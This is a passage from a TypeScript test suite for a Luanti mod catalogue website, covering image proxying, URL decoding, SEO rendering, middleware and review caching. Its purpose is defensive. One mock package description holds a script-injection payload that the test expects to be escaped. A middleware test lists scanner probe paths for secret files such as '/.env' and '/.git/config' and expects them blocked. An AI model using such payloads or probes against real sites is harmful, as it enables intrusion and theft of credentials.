    const directive = new ImgFallbackDirective({ nativeElement: imgEl } as any);
    directive.fallbackThumbnail = 'https://git.minetest.land/VoxeLibre/VoxeLibre/raw/branch/master/screenshot.png';

    // First error: falls back to proxied fallbackThumbnail
    directive.onError();
    expect(imgEl.src).toContain('/api/packages?proxy_image=');

    // Second error: falls back to logo.svg
    directive.onError();
    expect(imgEl.src).toContain('logo.svg');
  });

  it('prevents %2520 crawler canonical loops, SSR 500 stream crashes, scanner 200 false positives, and 415 image proxy errors', async () => {
    const { safeDecodeParam } = await import('../../functions/api/lib/upstream');
    const { onRequestGet: packageSsrGet } = await import('../../functions/package/[author]/[name]');
    const { onRequestGet: packagesApiGet } = await import('../../functions/api/packages/index');

    // 1. safeDecodeParam unwraps single-encoded, 59x-nested %2525...20, and malformed % strings safely
    expect(safeDecodeParam('Hybrid%20Dog')).toBe('Hybrid Dog');
    const deeplyEncoded = `LC%${'25'.repeat(58)}20Creations`;
    expect(safeDecodeParam(deeplyEncoded)).toBe('LC Creations');
    expect(safeDecodeParam('Bad%ZZPercent')).toBe('Bad%ZZPercent');

    // 2. /package/:author/:name 301-redirects double-encoded %25 URLs to clean canonical URLs
    const loopRedirectRes = await packageSsrGet({
      request: new Request(`https://luantihub.org/package/${deeplyEncoded}/blocky_portaling?lang=en`),
      params: { author: deeplyEncoded, name: 'blocky_portaling' },
      env: {}
    });
    expect(loopRedirectRes.status).toBe(301);
    expect(loopRedirectRes.headers.get('Location')).toBe(
      'https://luantihub.org/package/LC%20Creations/blocky_portaling?lang=en'
    );

    // 3. /package/:author/:name decodes single-encoded params without re-encoding % into %25,
    //    injects SEO metadata deterministically, and escapes </script> in JSON-LD / initial state
    const sampleShellHtml = `<!doctype html><html><head><title>Default</title><meta name="description" content="" /><meta name="keywords" content="" /><link rel="canonical" id="canonical-link" href="https://luantihub.org/" /><meta property="og:title" content="" /><meta property="og:description" content="" /><meta property="og:url" content="" /><meta property="og:image" content="" /><meta name="twitter:title" content="" /><meta name="twitter:description" content="" /><meta name="twitter:image" content="" /></head><body><main class="sr-only"></main></body></html>`;
    const ssrRes = await packageSsrGet({
      request: new Request('https://luantihub.org/package/Hybrid%20Dog/technic'),
      params: { author: 'Hybrid%20Dog', name: 'technic' },
      env: {
        ASSETS: {
          fetch: async () => new Response(sampleShellHtml, { status: 200 })
        },
        DB: {
          prepare: (sql: string) => ({
            bind: () => ({
              first: async () =>
                sql.includes('FROM packages')
                  ? {
                      title: 'Technic',
                      author_name: 'Hybrid Dog',
                      name: 'technic',
                      provider: 'github',
                      short_desc: 'Automation mod </script><script>alert(1)</script>',
                      long_desc: 'Full description',
                      type: 'mod',
                      license: 'LGPL-2.1',
                      downloads_count: 420
                    }
                  : { avg_rating: 4.8, cnt: 5 }
            })
          })
        }
      }
    });
    expect(ssrRes.status).toBe(200);
    const ssrHtml = await ssrRes.text();
    expect(ssrHtml).toContain('href="https://luantihub.org/package/Hybrid%20Dog/technic"');
    expect(ssrHtml).not.toContain('Hybrid%2520Dog');
    expect(ssrHtml).toContain('window.__LUANTI_INITIAL_PACKAGE__=');
    expect(ssrHtml).toContain('\\u003c/script\\u003e');
    expect(ssrHtml).not.toContain('</script><script>alert(1)</script>');

    // 4. Middleware blocks scanner probes (/.env, /wp-admin/*) with edge-cached 404 Not Found
    for (const probePath of ['/.env', '/wp-admin/install.php', '/.git/config']) {
      const probeRes = await edgeMiddleware({
        request: new Request(`https://luantihub.org${probePath}`),
        next: async () => new Response('should_not_reach_spa', { status: 200 }),
        env: {}
      });
      expect(probeRes.status).toBe(404);
      expect(probeRes.headers.get('Cache-Control')).toContain('max-age=86400');
    }

    // 5. Middleware allows read-only GET /api/auth/me on cross-site navigation while blocking POST /api/auth/me
    const crossSiteGetAuthRes = await edgeMiddleware({
      request: new Request('https://luantihub.org/api/auth/me', {
        method: 'GET',
        headers: {
          'Sec-Fetch-Site': 'cross-site',
          Referer: 'https://www.google.com/'
        }
      }),
      next: async () => Response.json({ user: null }),
      env: {}
    });
    expect(crossSiteGetAuthRes.status).toBe(200);

    // 6. Middleware error boundary catches downstream navigation exceptions and falls back to SPA shell
    const errSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
    const recoveredNavRes = await edgeMiddleware({
      request: new Request('https://luantihub.org/package/TenPlus1/hopper'),
      next: async () => {
        throw new Error('Simulated stream lock crash');
      },
      env: {
        ASSETS: {
          fetch: async () => new Response(sampleShellHtml, { status: 200 })
        }
      }
    });
    expect(recoveredNavRes.status).toBe(200);
    expect(errSpy).toHaveBeenCalled();
    errSpy.mockRestore();

    // 7. Image proxy detects PNG magic bytes on application/octet-stream and returns 200 fallback SVG instead of 415 on HTML
    const fetchSpy = vi.spyOn(globalThis, 'fetch').mockImplementation(async (input: any) => {
      const target = typeof input === 'string' ? input : input?.url || '';
      if (target.includes('broadleaf')) {
        return new Response('<!DOCTYPE html><html><body>Anubis</body></html>', {
          status: 200,
          headers: { 'Content-Type': 'text/html' }
        });
      }
      // Valid PNG magic bytes with application/octet-stream (as returned by Gitea /api/v1/repos/.../raw/...)
      return new Response(new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), {
        status: 200,
        headers: { 'Content-Type': 'application/octet-stream' }
      });
    });

    const htmlProxyRes = await packagesApiGet({
      request: new Request(
        'https://luantihub.org/api/packages?proxy_image=https%3A%2F%2Fgit.minetest.land%2FMeseHub%2Fbroadleaf%2Fraw%2Fbranch%2Fmaster%2Fscreenshot.png'
      ),
      env: {}
    });
    expect(htmlProxyRes.status).toBe(404);
    expect(htmlProxyRes.headers.get('X-Proxy-Fallback')).toBe('non-image-upstream');

    const octetPngProxyRes = await packagesApiGet({
      request: new Request(
        'https://luantihub.org/api/packages?proxy_image=https%3A%2F%2Fgit.minetest.land%2FVoxeLibre%2FVoxeLibre%2Fraw%2Fbranch%2Fmaster%2Fscreenshot.png'
      ),
      env: {}
    });
    expect(octetPngProxyRes.status).toBe(200);
    expect(octetPngProxyRes.headers.get('Content-Type')).toBe('image/png');
    fetchSpy.mockRestore();

    // 8. Validate wrangler.toml against Cloudflare Pages supportedPagesConfigFields schema
    //    (prevents Worker-only fields like [observability] or main from breaking Cloudflare Pages builds)
    const supportedPagesConfigFields = new Set([
      'pages_build_output_dir',
      'name',
      'compatibility_date',
      'compatibility_flags',
      'send_metrics',
      'no_bundle',
      'limits',
      'placement',
      'vars',
      'durable_objects',
      'kv_namespaces',
      'queues',
      'r2_buckets',
      'd1_databases',
      'vectorize',
      'hyperdrive',
      'services',
      'analytics_engine_datasets',
      'ai',
      'version_metadata',
      'dev',
      'mtls_certificates',
      'browser',
      'upload_source_maps',
      'env'
    ]);
    const nodeFs = (globalThis as any).process?.getBuiltinModule?.('node:fs');
    if (nodeFs) {
      const tomlText = String(nodeFs.readFileSync('wrangler.toml', 'utf8'));
      expect(tomlText).toContain('pages_build_output_dir');
      expect(tomlText).toContain('upload_source_maps = true');
      expect(tomlText).not.toContain('[observability]');
      let inTopLevel = true;
      for (const rawLine of tomlText.split(/\r?\n/)) {
        const line = rawLine.replace(/#.*$/, '').trim();
        if (!line) continue;
        const sectionMatch = line.match(/^\[+([a-zA-Z0-9_.-]+)\]+$/);
        if (sectionMatch) {
          inTopLevel = false;
          const rootSection = sectionMatch[1].split('.')[0];
          expect(supportedPagesConfigFields.has(rootSection)).toBe(true);
          continue;
        }
        if (inTopLevel) {
          const keyMatch = line.match(/^([a-zA-Z0-9_-]+)\s*=/);
          if (keyMatch) {
            expect(supportedPagesConfigFields.has(keyMatch[1])).toBe(true);
          }
        }
      }
    }
  });

  it('deduplicates Git raw URL variants, .cdb.json vs ContentDB uploads galleries, and primary thumbnail hashes across backend and frontend', async () => {
    const {
      getCanonicalScreenshotKey,
      mergeScreenshotsPreferringGit,
      scanGitRepoMetadataCached
    } = await import('../../functions/api/lib/upstream');
    const pkgService = TestBed.inject(PackageService);

    // 1. Canonical key matches across branch/API formats and proxy wrappers
    expect(
      getCanonicalScreenshotKey('https://raw.githubusercontent.com/Author/WaySigns/main/screenshot.png')
    ).toBe(
      getCanonicalScreenshotKey('https://raw.githubusercontent.com/Author/WaySigns/HEAD/screenshot.png')
    );
    expect(
      getCanonicalScreenshotKey('https://codeberg.org/Author/WaySigns/raw/branch/main/screenshot.png')
    ).toBe(
      getCanonicalScreenshotKey('https://codeberg.org/api/v1/repos/Author/WaySigns/raw/screenshot.png')
    );
    expect(
      getCanonicalScreenshotKey('https://gitlab.com/Author/WaySigns/-/raw/main/screenshot.png')
    ).toBe(
      getCanonicalScreenshotKey('https://gitlab.com/Author/WaySigns/-/raw/HEAD/screenshot.png')
    );
    expect(
      getCanonicalScreenshotKey('https://bitbucket.org/Author/WaySigns/raw/master/screenshot.png')
    ).toBe(
      getCanonicalScreenshotKey(
        'https://api.bitbucket.org/2.0/repositories/author/waysigns/src/master/screenshot.png'
      )
    );
    expect(
      getCanonicalScreenshotKey(
        '/api/packages?proxy_image=https%3A%2F%2Fgit.minetest.land%2FVoxeLibre%2FVoxeLibre%2Fraw%2Fbranch%2Fmaster%2Fscreenshot.png'
      )
    ).toBe(
      getCanonicalScreenshotKey(
        '/api/packages?proxy_image=https%3A%2F%2Fgit.minetest.land%2Fapi%2Fv1%2Frepos%2FVoxeLibre%2FVoxeLibre%2Fraw%2Fscreenshot.png&ngsw-bypass=true'
      )
    );
    expect(getCanonicalScreenshotKey('https://content.luanti.org/uploads/abc1234.png')).toBe(
      getCanonicalScreenshotKey('https://contentdb.milcho.org/uploads/abc1234.png')
    );

    // 2. MeseHub raw URLs are proxied through /api/packages?proxy_image=..., while Codeberg raw URLs stay direct
    const codebergRawShot = 'https://codeberg.org/api/v1/repos/tenplus1/mobs_redo/raw/screenshot.png';
    const proxiedCodebergShot = pkgService.toProxiedGitImageIfNeeded(codebergRawShot);
    expect(proxiedCodebergShot).toBe(codebergRawShot);
    const mesehubRawShot = 'https://git.minetest.land/VoxeLibre/VoxeLibre/raw/branch/master/screenshot.png';
    expect(pkgService.toProxiedGitImageIfNeeded(mesehubRawShot)).toBe(
      `/api/packages?proxy_image=${encodeURIComponent(mesehubRawShot)}&ngsw-bypass=true`
    );

    // 3. Single-screenshot package (Mobs Redo API scenario): never synthesizes a 404 /uploads/.png URL from a /thumbnails/1/.png URL
    const mobsCdbThumb = 'https://content.luanti.org/thumbnails/1/mobs_hash.png';
    const mergedMobs = mergeScreenshotsPreferringGit([codebergRawShot, mobsCdbThumb], []);
    expect(mergedMobs).toEqual([proxiedCodebergShot]);

    // 3b. Modal bannerImage falls back cleanly to ContentDB thumbnail when banner is logo.svg or fails, without mutating catalog thumbnail
    const mobsPkg = (pkgService as any).normalizePackage({
      id: 'TenPlus1/mobs',
      author: 'TenPlus1',
      name: 'mobs',
      title: 'Mobs Redo API',
      type: 'mod',
      thumbnail: mobsCdbThumb,
      banner: 'logo.svg',
      screenshots: []
    });
    expect(mobsPkg.thumbnail).toBe(mobsCdbThumb);
    expect(mobsPkg.banner).toBe(mobsCdbThumb);

    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    const modalComp = modalFixture.componentInstance;
    modalComp.package = { ...mobsPkg, banner: 'logo.svg', thumbnail: mobsCdbThumb };
    (pkgService as any)._activePackage.set(modalComp.package);
    expect(modalComp.bannerImage).toBe(mobsCdbThumb);

    // 3c. Hero banner (error) event race: if a Git screenshot fails on the hero <img> after the carousel
    // already marked it failed (so bannerImage already switched to mobsCdbThumb), onScreenshotError(undefined, event)
    // must read the failing Git URL from the DOM <img> element rather than marking mobsCdbThumb as failed
    modalComp.package = {
      ...mobsPkg,
      banner: codebergRawShot,
      thumbnail: mobsCdbThumb,
      screenshots: [codebergRawShot]
    };
    (pkgService as any)._activePackage.set(modalComp.package);
    modalComp.onScreenshotError(codebergRawShot);
    expect(modalComp.bannerImage).toBe(mobsCdbThumb);
    const fakeHeroImg = document.createElement('img');
    fakeHeroImg.setAttribute('src', codebergRawShot);
    modalComp.onScreenshotError(undefined, { target: fakeHeroImg } as unknown as Event);
    expect(modalComp.failedScreenshotUrls().has(mobsCdbThumb)).toBe(false);
    expect(modalComp.bannerImage).toBe(mobsCdbThumb);

    // 4. Multi-screenshot package (Draconis / VoxeLibre scenario): Git screenshot.png first + complementary ContentDB gallery with primary thumbnail duplicate removed
    const voxeGitShot = 'https://git.minetest.land/api/v1/repos/VoxeLibre/VoxeLibre/raw/screenshot.png';
    const voxeCdbThumb = 'https://content.luanti.org/thumbnails/1/8f7c4f97f4.png';
    const voxeCdbDup0 = 'https://content.luanti.org/uploads/8f7c4f97f4.png';
    const voxeCdbShot1 = 'https://content.luanti.org/uploads/gameplay_1.png';
    const voxeCdbShot2 = 'https://content.luanti.org/uploads/gameplay_2.png';
    const voxeCdbShot3 = 'https://content.luanti.org/uploads/gameplay_3.png';

    const mergedVoxe = mergeScreenshotsPreferringGit(
      [voxeGitShot, voxeCdbThumb],
      [voxeCdbDup0, voxeCdbShot1, voxeCdbShot2, voxeCdbShot3]
    );
    expect(mergedVoxe.length).toBe(4);
    expect(mergedVoxe[0]).toContain('proxy_image=');
    expect(mergedVoxe.slice(1)).toEqual([voxeCdbShot1, voxeCdbShot2, voxeCdbShot3]);

    // When a ContentDB package has 4 screenshots and no separate Git screenshot.png, all 4 ContentDB screenshots are preserved
    const draconisShots = [voxeCdbDup0, voxeCdbShot1, voxeCdbShot2, voxeCdbShot3];
    const mergedDraconis = mergeScreenshotsPreferringGit([voxeCdbThumb], draconisShots);
    expect(mergedDraconis).toEqual(draconisShots);

    // 5. scanGitRepoMetadataCached prefers root screenshot.png first and only includes verified .cdb.json relative screenshots
    const origFetch = globalThis.fetch;
    globalThis.fetch = vi.fn(async (input: RequestInfo | URL) => {
      const url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
      if (url.endsWith('/mod.conf')) {
        return new Response('name = waysigns\ntitle = WaySigns\nlicense = LGPL-2.1-or-later\n', {
          status: 200
        });
      }
      if (url.endsWith('/.cdb.json')) {
        return new Response(
          JSON.stringify({
            screenshots: ['./screenshots/1.png', './screenshots/missing.png']
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (url.endsWith('/screenshot.png') || url.endsWith('/screenshots/1.png')) {
        return new Response('PNG_BYTES_LONGER_THAN_32_BYTES_1234567890', {
          status: 200,
          headers: { 'Content-Type': 'image/png' }
        });
      }
      return new Response('Not found', { status: 404 });
    });

    try {
      const scanRes = await scanGitRepoMetadataCached(
        'TestAuthor',
        'waysigns',
        'mod',
        'https://codeberg.org/TestAuthor/waysigns',
        0
      );
      const expectedRootProxied = pkgService.toProxiedGitImageIfNeeded(
        'https://codeberg.org/api/v1/repos/TestAuthor/waysigns/raw/screenshot.png'
      );
      const expectedSubProxied = pkgService.toProxiedGitImageIfNeeded(
        'https://codeberg.org/api/v1/repos/TestAuthor/waysigns/raw/screenshots/1.png'
      );
      expect(scanRes.screenshotUrl).toBe(expectedRootProxied);
      expect(scanRes.screenshots).toEqual([expectedRootProxied, expectedSubProxied]);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should share DRY package utilities, prioritize Git banner in notifications & SEO with IndexedDB sync, and render reusable compact badges in AuthorDrawer', async () => {
    const {
      parseJsonArray,
      extractEngineVersionString,
      parseDownloadSizeBytes,
      formatByteSize,
      computeStarRatingFromData,
      extractEmbeddedVideo
    } = await import('./core/config/package-utils.config');
    const { normalizeRepoComparisonKey } = await import('./core/config/git-providers.config');

    // 1. Verify shared DRY utilities
    expect(parseJsonArray('["mod", "survival"]')).toEqual(['mod', 'survival']);
    expect(parseJsonArray('mod, survival')).toEqual(['mod', 'survival']);
    expect(parseJsonArray('[broken')).toEqual([]);
    expect(extractEngineVersionString({ name: '5.8.0' })).toBe('5.8.0');
    expect(parseDownloadSizeBytes('2.5 MB')).toBe(Math.round(2.5 * 1024 * 1024));
    expect(formatByteSize(512 * 1024)).toBe('512 KB');
    expect(
      computeStarRatingFromData({
        score: 300,
        review_thread_counts: { positive: 9, neutral: 1, negative: 0 }
      })
    ).toBeGreaterThanOrEqual(4.5);
    const extractedVideo = extractEmbeddedVideo(
      undefined,
      undefined,
      'Check out https://youtu.be/dQw4w9WgXcQ in action!'
    );
    expect(extractedVideo?.video_url).toBe('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
    expect(extractedVideo?.video_thumbnail_url).toContain('dQw4w9WgXcQ');
    expect(normalizeRepoComparisonKey('https://github.com/SaKeL/Everness.git/')).toBe(
      'github.com/sakel/everness'
    );

    // 2. Verify SeoService normalizes relative/proxied package banner URLs to absolute https://luantihub.org/...
    const seoService = TestBed.inject(SeoService);
    const pkgService = TestBed.inject(PackageService);
    const proxiedGitPkg = (pkgService as any).normalizePackage({
      id: 'SaKeL/everness',
      author: 'SaKeL',
      name: 'everness',
      title: 'Everness',
      type: 'mod',
      short_desc: 'Custom biomes',
      banner: '/api/packages?proxy_image=https%3A%2F%2Fcodeberg.org%2FSaKeL%2Feverness%2Fraw%2Fbranch%2Fmain%2Fscreenshot.png',
      thumbnail: 'https://content.luanti.org/thumbnails/1/everness.png',
      source: 'git'
    });
    seoService.updateForPackage(proxiedGitPkg);
    const ogImg = document.querySelector('meta[property="og:image"]')?.getAttribute('content') || '';
    expect(ogImg).toBe(
      'https://luantihub.org/api/packages?proxy_image=https%3A%2F%2Fcodeberg.org%2FSaKeL%2Feverness%2Fraw%2Fbranch%2Fmain%2Fscreenshot.png&ngsw-bypass=true'
    );

    // 3. Verify PwaService syncs notification state to IndexedDB on markReviewSeen() and prefers pkg.banner for notifications
    const pwaService = TestBed.inject(PwaService);
    const settingsService = TestBed.inject(SettingsService);
    const syncSpy = vi
      .spyOn(pwaService as any, 'syncNotificationStateToIndexedDb')
      .mockResolvedValue(undefined);

    pwaService.markReviewSeen('rev_test_sync_1');
    expect(syncSpy).toHaveBeenCalled();

    settingsService.notificationsEnabled.set(true);
    settingsService.notifyPackageUpdates.set(true);
    localStorage.removeItem('lh_known_package_versions_v1');

    const sentNotifs: any[] = [];
    const origSend = pwaService.sendNativeNotification.bind(pwaService);
    pwaService.sendNativeNotification = async (payload: any) => {
      sentNotifs.push(payload);
      return true;
    };

    try {
      const baseCatalog = [
        {
          ...proxiedGitPkg,
          banner: 'https://raw.githubusercontent.com/SaKeL/everness/main/screenshot.png',
          thumbnail: 'https://content.luanti.org/thumbnails/1/old_cdb_thumb.png',
          release_id: 'v1.0.0',
          updated_at: '2026-10-01T10:00:00Z'
        }
      ];
      await pwaService.checkAndNotifyUpdatedPackages(baseCatalog, { isBaselineSeedAllowed: true });
      await pwaService.checkAndNotifyUpdatedPackages(
        [
          {
            ...baseCatalog[0],
            release_id: 'v1.1.0',
            updated_at: new Date(Date.now() - 10_000).toISOString()
          }
        ],
        { isBaselineSeedAllowed: false }
      );
      expect(sentNotifs.length).toBe(1);
      // Git-first banner is preferred over legacy ContentDB thumbnail
      expect(sentNotifs[0].icon).toBe('https://raw.githubusercontent.com/SaKeL/everness/main/screenshot.png');
    } finally {
      pwaService.sendNativeNotification = origSend;
      syncSpy.mockRestore();
      localStorage.removeItem('lh_known_package_versions_v1');
    }
  });

  it('should compute star ratings from ContentDB review_thread_counts and reviews_list, queue official tiles for rating hydration, and preserve cached reviews across modal reopens', async () => {
    const { computeStarRatingFromData } = await import('./core/config/package-utils.config');
    const pkgService = TestBed.inject(PackageService);

    // 1. computeStarRatingFromData derives star rating from reviews_list when review_thread_counts is missing
    const ratingFromList = computeStarRatingFromData({
      score: 1200, // ContentDB popularity score (> 5)
      reviews_list: [
        { rating: 5, is_positive: true },
        { rating: 5, is_positive: true },
        { rating: 5, is_positive: true }
      ]
    });
    expect(ratingFromList).toBe(5);

    // 2. Official package without rating_checked or review_thread_counts is queued by needsTileHydration
    (pkgService as any).hydratedIds.clear();
    (pkgService as any).hydratedMetaCache.delete('philipbenr/realism_512');
    const realismPkg = (pkgService as any).normalizePackage({
      id: 'philipbenr/realism_512',
      author: 'philipbenr',
      name: 'realism_512',
      title: 'Realism 512',
      type: 'txp',
      source: 'official',
      sources: ['official'],
      license: 'CC-BY-SA-4.0',
      downloads: 8400,
      contentdb_downloads: 8400,
      tags: ['realistic', '512px'],
      banner: 'https://content.luanti.org/uploads/realism_512.png',
      thumbnail: 'https://content.luanti.org/thumbnails/1/realism_512.png',
      score: 420 // ContentDB popularity score (> 5), so star score starts at 0 until hydrated
    });
    expect(realismPkg.score).toBe(0);
    expect((pkgService as any).needsTileHydration(realismPkg)).toBe(true);

    // 3. Batch hydration via POST /api/packages/hydrate updates score, review_thread_counts, and rating_checked
    (pkgService as any)._packages.set([realismPkg]);
    (pkgService as any)._serverTop10Today.set([realismPkg]);
    const origFetch = globalThis.fetch;
    globalThis.fetch = vi.fn().mockImplementation(async (input: any) => {
      const url = String(input);
      if (url.includes('/api/packages/hydrate')) {
        return new Response(
          JSON.stringify({
            hydrated: {
              'philipbenr/realism_512': {
                license: 'CC-BY-SA-4.0',
                contentdb_downloads: 8400,
                downloads: 8400,
                score: 5,
                review_thread_counts: { positive: 3, neutral: 0, negative: 0 },
                tags: ['realistic', '512px']
              }
            }
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      return new Response('{}', { status: 404 });
    });

    try {
      await (pkgService as any).hydratePackageBatch([realismPkg]);
      const hydratedRealism = pkgService.packages().find(p => p.id === 'philipbenr/realism_512');
      expect(hydratedRealism?.score).toBe(5);
      expect(hydratedRealism?.review_thread_counts).toEqual({ positive: 3, neutral: 0, negative: 0 });
      expect(pkgService.top10TodayPackages()[0]?.score).toBe(5);
      expect(((pkgService as any).hydratedMetaCache.get('philipbenr/realism_512') as any)?.rating_checked).toBe(true);

      // 4. Subsequent catalog normalization preserves hydrated score and review_thread_counts even when catalog item lacks reviews
      const reNormalized = (pkgService as any).normalizePackage({
        id: 'philipbenr/realism_512',
        author: 'philipbenr',
        name: 'realism_512',
        title: 'Realism 512',
        type: 'txp',
        source: 'official',
        downloads: 8400,
        score: 420
      });
      expect(reNormalized.score).toBe(5);
      expect(reNormalized.review_thread_counts).toEqual({ positive: 3, neutral: 0, negative: 0 });

      // 5. Cached ContentDB reviews are never wiped by a lite detail load or empty bundled reviews_list when review_thread_counts > 0
      const cdbReviews = [
        {
          id: 'cdb_101',
          package_id: 'philipbenr/realism_512',
          source: 'contentdb' as const,
          rating: 5,
          is_positive: true,
          comment: 'Amazing 512x textures!',
          created_at: '2026-10-15T12:00:00Z',
          author: { username: 'voxel_fan', display_name: 'Voxel Fan', avatar_url: 'logo.svg' }
        }
      ];
      (pkgService as any).reviewsCache.set('philipbenr/realism_512', cdbReviews);
      (pkgService as any).edgeApiAvailable = true;

      globalThis.fetch = vi.fn().mockImplementation(async () => {
        return new Response(
          JSON.stringify({
            author: 'philipbenr',
            name: 'realism_512',
            title: 'Realism 512',
            type: 'txp',
            license: 'CC-BY-SA-4.0',
            downloads: 8400,
            score: 0,
            review_thread_counts: { positive: 3, neutral: 0, negative: 0 },
            reviews_list: []
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      });

      await pkgService.loadPackageDetails(reNormalized, true);
      const cachedAfterReload = pkgService.getCachedReviews(reNormalized);
      expect(cachedAfterReload?.length).toBe(1);
      expect(cachedAfterReload?.[0].comment).toBe('Amazing 512x textures!');
      const updatedInCatalog = pkgService.packages().find(p => p.id === 'philipbenr/realism_512');
      expect(updatedInCatalog?.score).toBe(5);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should reject dead mirror /storage/screenshots/ URLs and all-zero review_thread_counts so ContentDB images and reviews load reliably', async () => {
    const { isDeadMirrorScreenshotUrl, sanitizePackageImageUrl, mergeScreenshotsPreferringGit } = await import(
      './core/config/git-providers.config'
    );
    const { parseNonZeroReviewThreadCounts, deriveReviewThreadCountsFromList } = await import(
      './core/config/package-utils.config'
    );
    const pkgService = TestBed.inject(PackageService);

    // 1. Dead mirror `/storage/screenshots/...` URLs are rejected while official `/thumbnails/` and `/uploads/` are preserved
    expect(isDeadMirrorScreenshotUrl('https://contentdb.milcho.org/storage/screenshots/TenPlus1/mobs/thumbnail.png')).toBe(true);
    expect(isDeadMirrorScreenshotUrl('https://content.luanti.org/storage/screenshots/TenPlus1/mobs/shot-0.png')).toBe(true);
    expect(sanitizePackageImageUrl('https://contentdb.milcho.org/storage/screenshots/TenPlus1/mobs/thumbnail.png')).toBeUndefined();
    expect(sanitizePackageImageUrl('https://content.luanti.org/thumbnails/1/dc6e96f2d4.png')).toBe(
      'https://content.luanti.org/thumbnails/1/dc6e96f2d4.png'
    );

    // 2. Merging screenshots for ElCeejo/draconis preserves Git screenshot + 3 ContentDB gallery uploads while discarding dead mirror URLs
    const draconisMerged = mergeScreenshotsPreferringGit(
      ['https://raw.githubusercontent.com/ElCeejo/draconis/main/screenshot.png'],
      [
        'https://content.luanti.org/storage/screenshots/ElCeejo/draconis/shot-0.png',
        'https://cdn.content.luanti.org/uploads/6b78f710d1.png',
        'https://cdn.content.luanti.org/uploads/f277cb49ae.png',
        'https://cdn.content.luanti.org/uploads/89fd62a3ef.png'
      ]
    );
    expect(draconisMerged).toEqual([
      'https://raw.githubusercontent.com/ElCeejo/draconis/main/screenshot.png',
      'https://cdn.content.luanti.org/uploads/6b78f710d1.png',
      'https://cdn.content.luanti.org/uploads/f277cb49ae.png',
      'https://cdn.content.luanti.org/uploads/89fd62a3ef.png'
    ]);

    // 3. All-zero mirror review_thread_counts (`{positive:0,neutral:0,negative:0}`) are rejected and derived from reviews_list
    expect(parseNonZeroReviewThreadCounts({ positive: 0, neutral: 0, negative: 0 })).toBeUndefined();
    expect(parseNonZeroReviewThreadCounts('{"positive":0,"neutral":0,"negative":0}')).toBeUndefined();
    expect(
      deriveReviewThreadCountsFromList([
        { rating: 5, is_positive: true },
        { rating: 5, is_positive: true },
        { rating: 3 },
        { rating: 1, is_positive: false }
      ])
    ).toEqual({ positive: 2, neutral: 1, negative: 1 });

    // 4. Poisoned D1 detail response with `/storage/screenshots/` does not overwrite valid catalog thumbnail/banner on TenPlus1/mobs
    const mobsTile = (pkgService as any).normalizePackage({
      id: 'TenPlus1/mobs',
      author: 'TenPlus1',
      name: 'mobs',
      title: 'Mobs Redo API',
      type: 'mod',
      source: 'official',
      sources: ['official'],
      thumbnail: 'https://content.luanti.org/thumbnails/1/dc6e96f2d4.png',
      banner: 'https://cdn.content.luanti.org/uploads/dc6e96f2d4.png',
      downloads: 521400,
      score: 4.8
    });
    (pkgService as any)._packages.set([mobsTile]);
    (pkgService as any).deepHydratedIds.delete('tenplus1/mobs');
    (pkgService as any).reviewsCache.delete('tenplus1/mobs');
    (pkgService as any).reviewsVerifiedEmptyKeys.delete('tenplus1/mobs');
    (pkgService as any).edgeApiAvailable = true;

    const origFetch = globalThis.fetch;
    globalThis.fetch = vi.fn().mockImplementation(async (input: any) => {
      const url = String(input);
      if (url.includes('/api/packages/TenPlus1/mobs/reviews')) {
        return new Response(
          JSON.stringify([
            {
              id: 'cdb_501',
              package_id: 'TenPlus1/mobs',
              source: 'contentdb',
              rating: 5,
              is_positive: true,
              comment: 'Essential mob API for Luanti!',
              created_at: '2026-10-20T10:00:00Z',
              author: { username: 'player1', display_name: 'Player 1', avatar_url: 'logo.svg' }
            }
          ]),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      return new Response(
        JSON.stringify({
          author: 'TenPlus1',
          name: 'mobs',
          title: 'Mobs Redo API',
          type: 'mod',
          license: 'MIT',
          downloads: 521400,
          thumbnail: 'https://content.luanti.org/storage/screenshots/TenPlus1/mobs/thumbnail.png',
          banner: 'https://content.luanti.org/storage/screenshots/TenPlus1/mobs/shot-0.png',
          screenshots: ['https://content.luanti.org/storage/screenshots/TenPlus1/mobs/shot-0.png'],
          review_thread_counts: { positive: 0, neutral: 0, negative: 0 },
          reviews_list: []
        }),
        { status: 200, headers: { 'Content-Type': 'application/json' } }
      );
    });

    try {
      await pkgService.loadPackageDetails(mobsTile, true);
      const afterDetail = pkgService.packages().find(p => p.id === 'TenPlus1/mobs')!;
      expect(afterDetail.thumbnail).toBe('https://content.luanti.org/thumbnails/1/dc6e96f2d4.png');
      expect(afterDetail.banner).toBe(
        'https://cdn.content.luanti.org/uploads/dc6e96f2d4.png?width=1100&aspect_ratio=16:9'
      );

      // Ensure fetchReviews is NOT blocked by `{positive:0,neutral:0,negative:0}` and fetches `/api/packages/TenPlus1/mobs/reviews`
      const fetchedRevs = await pkgService.fetchReviews(afterDetail);
      expect(fetchedRevs.length).toBe(1);
      expect(fetchedRevs[0].comment).toBe('Essential mob API for Luanti!');
      expect(pkgService.packages().find(p => p.id === 'TenPlus1/mobs')?.score).toBe(5);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should deprioritize pure dependency/API packages from Top 10 & Hero rows, hydrate tile star ratings across multi-tier cache, and paginate/lazy-load community reviews', async () => {
    const {
      buildReverseDependencyCountMap,
      isApiOrLibraryPackage,
      computeDependencyPrioritizationMultiplier,
      isPrimarilyDependencyPackage
    } = await import('./core/config/package-utils.config');
    const pkgService = TestBed.inject(PackageService);

    // 1. Verify dependency & API detection and prioritization multiplier
    const mobsApiPkg = (pkgService as any).normalizePackage({
      id: 'TenPlus1/mobs',
      author: 'TenPlus1',
      name: 'mobs',
      title: 'Mobs Redo API',
      short_desc: 'Simple and feature rich API to quickly add mobs into your world.',
      desc: 'You need to install some other mods! This mod contains a simple and feature rich API to add mobs.',
      type: 'mod',
      tags: ['mobs', 'library'],
      downloads: 521400,
      downloads_today: 420,
      downloads_week: 2800,
      dependency_ratio: 0.94,
      score: 4.8
    });

